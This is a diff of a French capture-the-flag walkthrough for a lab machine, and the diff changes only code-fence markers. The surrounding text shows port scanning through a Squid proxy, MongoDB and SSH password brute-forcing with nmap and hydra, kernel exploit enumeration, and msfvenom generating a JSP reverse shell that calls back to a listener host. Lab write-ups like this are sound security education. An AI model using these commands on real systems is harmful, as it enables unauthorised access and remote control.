@@ -10,7 +10,7 @@ Bananaa
 
 On commence avec les ports suivants ouverts sur la machine :  
 
-```plain
+```
 22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
 3128/tcp  open     http-proxy Squid http proxy 3.5.27
 8080/tcp  open     http       Apache Tomcat
@@ -43,7 +43,7 @@ for port in range(1,65536):
 
 En *Patator* ça se traduirait comme ceci :  
 
-```plain
+```
 patator http_fuzz proxy=10.1.1.21:3128 proxy_type=http url='http://127.0.0.1:RANGE0/' -x ignore:fgrep="Access control configuration prevents your request from being allowed at this time"  0=int:1-65535
 ```
 
@@ -55,7 +55,7 @@ S'agissant vraisemblablement d'une histoire de permission on va brute-forcer le 
 
 Nmap devrait faire l'affaire pour cela :  
 
-```plain
+```
 $ nmap -p 27018 10.1.1.21 --script +mongodb-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt
 Starting Nmap 7.70 ( https://nmap.org )
 Nmap scan report for 10.1.1.21
@@ -161,7 +161,7 @@ for p in processes:
 
 Ici j'utilise 4 process en parallèle. Ce sera jamais à la hauteur du parallélisme de Go ou Rust mais ça fonctionne :  
 
-```plain
+```
 $ python mongo_brute.py pass.txt
 Lauching 4 cracking processes
 Authentication succeed with password iloveyou
@@ -182,7 +182,7 @@ On trouve des hashs facilement cassables (une recherche Google suffit) dans la c
 
 La collection *users* dispose de différentes entrées (*ben*, *lionel*, *chawki*). On place les users et les passwords dans des fichiers respectifs et on voit ce que le brute-force peut donner.  
 
-```plain
+```
 $ hydra -L users.txt -P pass.txt -e nsr ssh://10.1.1.21
 Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -203,13 +203,13 @@ Lychee
 
 Cet accès SSH nous permet d'obtenir le premier flag. On est sur une distrib *Ubuntu 18.04 LTS Bionic Beaver* avec le kernel suivant :  
 
-```plain
+```
 Linux mangoo 4.15.0-30-generic #32-Ubuntu SMP Thu Jul 26 17:42:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 On peut avoir recours à [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) pour déterminer si le système est vulnérable :  
 
-```plain
+```
 Available information:
 
 Kernel version: 4.15.0
@@ -257,7 +257,7 @@ Pineapplee
 
 Regardons du côté des dossiers dans lesquels on peut écrire :  
 
-```plain
+```
 chawki@mangoo:~$ find / -type d -writable -not -path '/proc/*' 2> /dev/null
 /var/lib/tomcat8/webapps/ROOT
 /var/lib/lxcfs/proc
@@ -291,7 +291,7 @@ On sait que *Tomcat* utilise un fichier XML */etc/tomcat8/tomcat-users.xml* dans
 
 On peut placer un reverse shell JSP dans le dossier et voir les droits que l'on obtient en appelant son URL :  
 
-```plain
+```
 $ msfvenom --format raw --platform linux -p java/jsp_shell_reverse_tcp LHOST=10.254.0.29 LPORT=7777 -o devloop_cb.jsp
 Payload size: 1497 bytes
 Saved as: devloop_cb.jsp
